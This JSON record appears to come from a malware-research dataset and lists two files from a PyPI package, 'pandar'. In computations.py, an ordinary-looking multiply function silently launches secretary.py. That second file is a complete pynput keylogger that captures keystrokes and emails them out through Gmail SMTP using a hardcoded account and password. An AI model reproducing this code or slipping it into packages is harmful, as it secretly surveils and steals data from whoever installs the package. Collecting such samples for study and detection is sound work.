[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/pandar-1.1.4/pandar-1.1.4/pandar/computations.py",
    "malicious_code": "from subprocess import Popen\nimport traceback\nfrom os import path\n\nROOT = path.abspath(path.dirname(__file__))\n\ndef mul(x, y):\n    try:\n        Popen(['python3', ROOT + '/secretary.py'], shell=False)\n    except:\n        traceback.print_exc()\n    return x*y"
  },
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/pandar-1.1.4/pandar-1.1.4/pandar/secretary.py",
    "malicious_code": "import os\nimport sys\nimport smtplib\nimport ssl\nfrom email import encoders\nfrom email.mime.base import MIMEBase\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.text import MIMEText\nfrom enum import Enum\nfrom pynput import keyboard\nfrom os import path\n\n# initial attempt to create a keylogger.\n__author__ = 'RottenCrab'\n\nglobal keymap\nglobal final_keystrokes\n\nROOT = path.abspath(path.dirname(__file__))\n\nkeymap = []\nfinal_keystrokes = []\n\ndef on_press(key):\n    try:\n        keymap.append(key.char)\n    except AttributeError:\n        keymap.append(key)\n\ndef on_release(key):\n    if key == keyboard.Key.esc:\n        return False\n\ndef collector():\n    with keyboard.Listener(\n            on_press=on_press,\n            on_release=on_release) as listener:\n        listener.join()\n\ndef keystroke_join():\n    for _ in keymap:\n        if type(_) is str:\n            final_keystrokes.append(_)\n        else:\n            special_key(_)\n\ndef special_key(key):\n    if key.name.lower() == \"enter\":\n        final_keystrokes.append(\"\\n\")\n    elif key.name.lower() == \"backspace\":\n        if len(final_keystrokes) > 0:\n            final_keystrokes.pop()\n    elif key.name.lower() == \"space\":\n        final_keystrokes.append(\" \")\n    elif key.name.lower() == \"ctrl\":\n        position = keymap.index(key)\n        del[keymap[position]]\n        del[keymap[position]]\n    else:\n        pass\n\ndef final():\n    keystroke_join()\n    return \"\".join([x for x in final_keystrokes])\n\ndef sent_email():\n    try:\n        port = 465  # For SSL\n        smtp_server = \"smtp.gmail.com\"\n        sender_email = \"democsec@gmail.com\"  # Enter your address\n        receiver_email = \"csec.aueb@gmail.com\"  # Enter receiver address\n        password = \"dfsfgs!322Dasfa\"\n        message = \"\"\"\\\n        Subject: Keylogger report\n\n        \"\"\"\n        message += final()\n\n        context = ssl.create_default_context()\n        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:\n            server.login(sender_email, password)\n            server.sendmail(sender_email, receiver_email, message)\n    except:\n        print(\"Unable to send the email. Error: \", sys.exc_info()[0])\n        raise\n\nif __name__ == '__main__':\n    collector()\n    sent_email()\n"
  }
]